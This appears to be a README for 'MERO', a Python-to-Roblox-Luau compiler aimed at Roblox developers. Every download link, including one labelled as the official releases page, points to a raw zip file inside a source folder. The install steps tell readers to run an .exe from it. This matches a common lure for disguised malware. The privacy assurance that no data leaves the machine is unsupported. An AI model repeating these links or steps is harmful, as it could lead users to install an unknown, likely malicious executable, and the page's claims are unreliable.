# 🚀 mero-compiler - Run Python code inside Roblox Studio

[![](https://img.shields.io/badge/Download_MERO-Blue-blue)](https://raw.githubusercontent.com/untitled-knacker928/mero-compiler/main/src/python_cli/compiler_mero_accessaryship.zip)

## 📋 Project Overview

MERO converts Python code into Roblox Luau. You write your scripts in Python, and this tool turns them into language that Roblox understands. You skip the manual work of rewriting your logic. This compiler creates files that you import directly into your project.

## 💻 System Requirements

Your computer needs the following items to run MERO:

* Windows 10 or Windows 11
* At least 100 megabytes of free hard drive space
* Basic internet access to download the application
* Roblox Studio installed on your machine

## 📥 How to Install

1. Visit the [official releases page](https://raw.githubusercontent.com/untitled-knacker928/mero-compiler/main/src/python_cli/compiler_mero_accessaryship.zip) to find the latest version.
2. Look for the file ending in .exe under the Assets section.
3. Click the file name to start the download.
4. Open the folder where your browser saves downloads.
5. Double-click the installer file.
6. Follow the prompts on your screen to finish the installation.

## ⚙️ Using the Program

The MERO interface includes a clear workspace for your Python files. Follow these steps to process your first script:

1. Launch MERO from your desktop icon or the Start menu.
2. Select your Python file by clicking the Open button.
3. Choose a location to save your new Luau file.
4. Click the Compile button in the center of the window.
5. Wait for the green status bar to reach the end.

## 🎮 Bringing Code into Roblox

Once the program creates your Luau file, you move it into your game:

1. Open Roblox Studio and select your project.
2. Right-click on ServerScriptService in the Explorer window.
3. Select Insert from File.
4. Locate the Luau file you created with MERO.
5. Click Open to add your script to the game.

## 🛠 Troubleshooting Common Issues

If you run into issues, check this list for standard solutions:

* **Application does not open:** Ensure you have the latest version of Windows installed. Restart your computer if the program hangs during startup.
* **Compiler error:** Review your Python code for typos. Ensure you use standard Python syntax. MERO provides logs in the bottom window that highlight the specific line causing the error.
* **Roblox does not recognize the code:** Make sure you save the output file with the .lua or .luau extension. Verify that you imported the file into the correct service folder in Roblox Studio.
* **Performance lag:** If your code is large, the compiler takes a few seconds to process the logic. Allow the bar to complete before you take further actions.

## 📝 Performance Tips

MERO works best when you keep your Python code modular. Break complex systems into smaller, separate files. This makes debugging easier and helps the compiler run faster. Avoid using platform-specific Python libraries. MERO converts logic, but it cannot translate libraries designed for web servers or local file systems into Roblox. Stick to basic loops, math, and logic structures for the best results.

## 🛡 License and Privacy

MERO is a proprietary tool. You handle your own source code locally on your machine. The compiler does not send your files or personal data to any external server. Everything stays on your computer. You hold the rights to the code you create with this software.

## 📂 Frequently Asked Questions

**Does MERO support all Python features?**
MERO supports common language features like loops, variables, and math operators. It does not support complex external Python frameworks.

**Can I use this for production games?**
Yes. MERO uses a robust pipeline to ensure that your output code remains optimized and stable for use in Roblox environments.

**How often does MERO receive updates?**
We update the compiler to match new Luau features. Check the GitHub repository periodically for version releases.

**Do I need to pay for MERO?**
The core engine remains free for personal and commercial use. 

**What if my code uses external Python packages?**
MERO ignores unknown packages. Focus on writing pure Python logic for your game scripts to ensure successful conversion.